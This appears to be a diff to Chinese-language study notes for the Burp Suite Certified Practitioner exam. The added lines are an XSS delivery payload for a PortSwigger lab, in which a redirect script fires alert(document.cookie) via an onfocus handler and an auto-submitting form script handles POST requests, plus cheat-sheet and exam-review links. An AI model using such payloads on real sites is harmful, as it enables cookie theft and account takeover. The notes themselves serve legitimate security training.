@@ -41,7 +41,18 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20
 常见的通过exploit server deliver payload给victim的方法
 a.<iframe>
 b.<script>
+If you are sending a GET request, you can use the following to auto-fire the payload.
+<script> location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'; </script>
+Note: This injection creates a custom tag with the ID x, which contains an onfocus event handler that triggers the alert function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the alert payload to be called.
+
+If you are sending a POST request, you can use the following to trigger the payload. 
+You can use the following to auto trigger the payload.
+  <script>
+        document.forms[0].submit();
+  </script>
 拿到cookie后就可以在浏览器中替换它访问carlos账号了
+
+https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 
 2. 通过请求走私
 https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests
@@ -130,6 +141,8 @@ echo file_get_contents("test.txt");
 
 
 别人的考试经验:
+https://micahvandeusen.com/burp-suite-certified-practitioner-exam-review/ (重点看这个)
+https://bscpcheatsheet.gitbook.io/exam/
 https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/README.md
 https://www.youtube.com/watch?v=yC0F05oggTE&list=PLsDxQTEdg_YkVMP6PybE7I-hAdhR7adem&index=42
 https://www.youtube.com/watch?v=fNoX_9v6-aY
